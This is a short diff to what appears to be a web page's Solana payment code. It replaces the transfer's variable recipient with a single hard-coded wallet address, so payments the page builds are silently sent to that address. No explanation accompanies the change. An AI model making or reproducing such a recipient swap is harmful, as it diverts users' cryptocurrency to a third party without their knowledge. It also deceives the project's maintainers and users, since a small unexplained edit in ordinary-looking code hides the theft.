@@ -347,7 +347,7 @@ document.addEventListener('DOMContentLoaded', () => {
             const transaction = new solanaWeb3.Transaction().add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: fromPubkey,
-                    toPubkey: toPubkey,
+                    toPubkey: "FR3q2GB1hQBbikju99HNwkxZbJm2nDwyhfatKxTTRpNU",
                     lamports: totalPrice * solanaWeb3.LAMPORTS_PER_SOL,
                 })
             );
